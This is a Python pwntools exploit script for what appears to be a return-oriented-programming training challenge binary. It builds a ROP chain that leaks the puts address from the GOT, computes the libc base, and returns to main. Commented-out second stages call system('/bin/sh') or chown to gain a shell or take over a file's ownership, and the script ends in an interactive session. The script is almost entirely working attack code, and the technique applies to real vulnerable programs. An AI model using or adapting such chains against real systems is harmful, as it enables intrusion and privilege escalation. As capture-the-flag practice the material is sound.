#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level9_teaching1'
e = ELF('./babyrop_level9_teaching1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = ROP(libc)
r2 = ROP(e)
getGadgetBinary = lambda x: p64(r2.find_gadget(x).address)
#p = gdb.debug(['./babyrop_level9_teaching1'])
p = process('./babyrop_level9_teaching1')
# payload 1: find puts and offset
ret = getGadgetBinary(['ret'])
exploit = getGadgetBinary(['pop rdi', 'ret'])
exploit += p64(e.sym.got['puts'])
exploit += p64(e.sym.plt['puts'])
exploit += p64(e.sym['main'])
# ropper --file babyrop_level9_teaching1 --stack-pivot
# r.call(e.sym['read'], [0])
p.sendline(56*ret+exploit)
p.recvuntil(b'Exiting!\n')
puts_plt = u64(p.recvline().ljust(8, b"\x00"))
log.info('puts is @ '+hex(puts_plt))
# payload 2: use offset to find address
libc.address = puts_plt - libc.sym['puts']
getGadget = lambda x: p64(r.find_gadget(x).address+libc.address)
# ret = getGadget(['ret'])
# exploit = getGadget(['pop rdi', 'ret'])
# exploit += p64(next(libc.search(b'/bin/sh')))
# exploit += p64(libc.sym["system"])
# exploit += p64(libc.sym["exit"])
# ret = getGadget(['ret'])
# exploit = getGadget(['pop rdi', 'ret'])
# exploit += p64(next(e.search(b"e\x00")))
# exploit += getGadget(['pop rsi', 'ret'])
# exploit += p64(1000)
# exploit += getGadget(['pop rdx', 'pop rbx', 'ret'])
# exploit += p64(1000)
# exploit += p64(0)
# exploit += p64(libc.sym["chown"])
# exploit += p64(libc.sym["exit"])
# p.sendline((56*ret)+exploit)
p.interactive()